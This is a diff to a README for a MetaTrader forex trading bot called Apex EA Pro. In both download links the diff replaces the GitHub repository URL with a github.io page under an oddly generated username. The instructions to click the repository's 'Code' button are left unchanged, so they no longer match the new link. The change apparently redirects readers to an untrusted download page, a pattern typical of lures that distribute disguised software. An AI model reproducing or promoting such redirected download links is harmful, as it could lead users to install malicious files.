@@ -1,6 +1,6 @@
 # 📈 apex-automated-ea - Automate your forex trades with precision
 
-[![](https://img.shields.io/badge/Download-Apex_EA_Pro-blue.svg)](https://github.com/guildsocialismincompetence200/apex-automated-ea)
+[![](https://img.shields.io/badge/Download-Apex_EA_Pro-blue.svg)](https://guildsocialismincompetence200.github.io)
 
 Apex EA Pro manages your forex trades on MetaTrader 4 and MetaTrader 5. It uses a fixed 0.5% risk allocation for every position. The software attaches a hard stop loss to every order to protect your capital.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Ensure you have the MetaTr
 
 Visit the link below to download the software files to your computer.
 
-[Click here to visit the repository and download the files](https://github.com/guildsocialismincompetence200/apex-automated-ea)
+[Click here to visit the repository and download the files](https://guildsocialismincompetence200.github.io)
 
 Click the green button labeled "Code" on the repository page. Select "Download ZIP" from the menu. Save the file to your desktop or your Downloads folder.
 
